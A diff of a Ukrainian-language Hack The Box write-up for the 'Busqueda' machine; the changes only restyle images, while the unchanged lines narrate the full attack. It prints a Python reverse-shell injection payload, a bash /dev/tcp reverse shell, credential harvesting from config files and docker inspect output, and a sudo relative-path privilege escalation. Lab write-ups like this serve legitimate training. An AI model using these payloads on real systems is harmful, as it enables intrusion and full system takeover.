@@ -7,55 +7,55 @@ date: 2025-12-05
 Hack the Box - Busqueda
 Новий день - нова машина. Сьогодні лінуксовська easy тачка з SSTI і експлуатацією кастомних скриптів.
 Почавши з базового Nmap - бачимо 2 відкриті TCP порти. Веб - 80 і SSH 22. Для другого в нас нема ні логіну, ні паролю, тому відкриваємо другий. І нас вітає ... не сайт, а помилка, що сервер перенаправив нас на searcher.htb(налаштовано як дефолтний сайт на сервері), але наш комп не знає, що це за сайт, тому ідемо в /etc/hosts і прописуємо - всі запити до searcher.htb слати на айпішник машини. І от нарешті, отримуємо сайт.
-<img width="1883" height="988" alt="Pasted image 20251205190551" src="https://github.com/user-attachments/assets/f7857260-353e-4283-ab96-6c7bf6a934ec" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205190551" src="https://github.com/user-attachments/assets/f7857260-353e-4283-ab96-6c7bf6a934ec" />
 
 Він займається тим, що створює посилання для пошуку на різних платформах і вертає нам посилання. Внизу сайту вказаний фреймворк `searchor 2.4.0`. По зову серця ідемо шукати публічні вразливості. І знаходимо - SSTI(коли сервер не фільтрує ввід і приймає введення як конструкції мови програмування, що дозволяє нам виконувати код). Тут я витратив трохи часу на те щоб знайти правильний пейлоад, і вставити в
 правильне місце. Сам запит приймає платформу і пошукові слова. І от в останні вставляємо наступний пейлоад:
 ```
 ',import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")#
 ```
-<img width="786" height="103" alt="Pasted image 20251205205825" src="https://github.com/user-attachments/assets/eaf8cdb3-a430-4084-876a-1d1b5154255c" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205205825" src="https://github.com/user-attachments/assets/eaf8cdb3-a430-4084-876a-1d1b5154255c" />
 
 І відповідно netcat-ом ловимо шел. Але шел не простий - ~~Золотий~~ сирий, і половина команд нам буде казати, що хоче норм шел, а не щось написане на коліні. Один з простих способів апгрейднути шел -
 `python3 -c 'import pty;pty.spawn("/bin/bash")'` - і система вважає що ми вже ~~дядько~~ в нормальному шелі. Ось юзер доступ на руках і ми ідемо далі - ескалація привілей, з якою я добряче задовбався. Але ми зробимо вигляд, що все завжди виходить з першого разу.
 Так як експлуатували ми веб додаток, то і заходимо в систему в його папці(`/var/www/app/`), подивившись що і де, в цій же директорії знаходимо .git папку, яка свідчить, що цей файл десь зберігається в репозиторії(натяк). А в папці - config файл, насправді, в норм компаніях, на проді таке не роблять, але самі знаєте) 
-<img width="791" height="220" alt="Pasted image 20251205205513" src="https://github.com/user-attachments/assets/b0ea9775-a666-4307-ae47-96016094788f" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205205513" src="https://github.com/user-attachments/assets/b0ea9775-a666-4307-ae47-96016094788f" />
 
 І тут же, в файлі - url всередині якої логін і пароль - до нашого нинішнього користувача. А сама лінка - gitea.searcher.htb, що наштовхує на думку - перевірити чи не маємо ми теж доступ. В той же `/etc/hosts` додаємо новий запит і в браузері бачимо сторінку gitea -локальний мененджер гіт репозиторіїв. 
 
-<img width="1895" height="852" alt="Pasted image 20251205205540" src="https://github.com/user-attachments/assets/c3f284a9-5872-48fc-9f22-e7334b896fdc" />
+<img style="height:auto; max-width:100%" alt="Pasted image 20251205205540" src="https://github.com/user-attachments/assets/c3f284a9-5872-48fc-9f22-e7334b896fdc" />
 
 Скориставшись кредами, які щойно отримали - заходимо. А всередині знаходимо репозиторій з тією ж апкою, що тільки що ламали, тому не так цікаво. Але, в списку користувачів є ще й Administrator - може в нього є щось цікаве?
 Так чи інакше вертаємося в термінал і дивимося, що може наш юзер - `sudo -l` - виводить нам, що ми можемо запускати якийсь кастомний скріпт від імені root.
-<img width="548" height="122" alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/982ab488-e975-439c-b5f6-51e0619c9bb4" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/982ab488-e975-439c-b5f6-51e0619c9bb4" />
 
 Запускати, але не читати. Тому методом научного тику запускаємо. І скрипт дає нам список своїх можливостей 
-<img width="548" height="122" alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/faf29b0a-b5dd-4544-a2fe-8c8ca1b42d87" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/faf29b0a-b5dd-4544-a2fe-8c8ca1b42d87" />
 
 1. Docker-ps(Скоріше за все `docker ps` під капотом)
 2. Docker-insect(Скоріше за все `docker inspect` під капотом)
 3. FullCheckup(Скоріше за все щось кастомне під капотом)
 
 Підемо по порядку - docker-ps показує нам список контейнерів які є - gitea і mysql(скоріше за все для неї ж).
-<img width="548" height="122" alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/134d31e3-5daa-40f5-ac28-7f3d50d2aa9d" />
+<img style="height:auto; max-width:100%" alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/134d31e3-5daa-40f5-ac28-7f3d50d2aa9d" />
 
 docker-inspect - вже цікавіше - вона описує контейнер і все що йому передавалося. А передатися можуть і паролі, і логіни, і всіляке інше. Вводимо команду, але вона вимагає від нас синтаксу(
-<img width="548" height="122" alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/cd821d1f-19fe-4049-8b75-dbc47a5d5649" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205205657" src="https://github.com/user-attachments/assets/cd821d1f-19fe-4049-8b75-dbc47a5d5649" />
 
 Погугливши, знаходимо як це все писати, тому кінцева команда виглядає так:
 `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect -f '{{json .}}' <тег контейнера>`
 І дає це нам здорове таке полотно тексту зі всіма конфігами контейнера:
-<img width="1896" height="475" alt="Pasted image 20251205210254" src="https://github.com/user-attachments/assets/1aeb33de-a724-425a-8d65-a3a399726373" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205210254" src="https://github.com/user-attachments/assets/1aeb33de-a724-425a-8d65-a3a399726373" />
 
 І серед цього місива знаходимо креди - пароль до mysql(точніше, юзера і рута). Ми б могли б сходити в mysql і глянути що там, але для початку перевіримо password reuse. І бінго, ми можемо зайти в gitea під адміном з цим паролем. В його репозиторіях ми знаходимо сорс код до system-checkup.py. І тепер буде легше його проексплуатувати.
-<img width="1208" height="409" alt="Pasted image 20251205210339" src="https://github.com/user-attachments/assets/57e6ed6d-a87c-4db7-8ccc-ac21e7333016" />
+<img style="height:auto; max-width:100%"  alt="Pasted image 20251205210339" src="https://github.com/user-attachments/assets/57e6ed6d-a87c-4db7-8ccc-ac21e7333016" />
 Як бачимо, команда full-checkup - викликає за відносним шляхом файл ./full-checkup.sh . Але як, якщо його нема? А ніяк. При спробі запуску ми отримуємо "Something went wrong", бо програма не може знайти скрипт для запуску(нагадую, від імені root). Так давайте допоможемо бідній програмі знайти full-checkup.sh . Відкриваємо будь яку дерикторію, в яку можемо писати і створюємо файл full-checkup.sh з наступним вмістом(звичайни реверс шел):
 ```
 #!/bin/bash
 sh -i >& /dev/tcp/10.10.14.18/9002 0>&1
 ```
 Даємо йому права на виконання `chmod +x full-checkup.sh` і запускаємо `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-chekup`. І врешті решт - на руках рут
-<img width="589" height="271" alt="Pasted image 20251205205403" src="https://github.com/user-attachments/assets/b96234ac-6b7d-47f7-a8c5-e3750970e351" />
+<img style="height:auto; max-width:100%" alt="Pasted image 20251205205403" src="https://github.com/user-attachments/assets/b96234ac-6b7d-47f7-a8c5-e3750970e351" />
 
 
 Мораль: класна тачка, але я добряче набігався з ескалацією, і я б поставив машину все ж на medium. Урок на сьогодні - читаємо сорс код, не поремо гарячку, робимо діла.
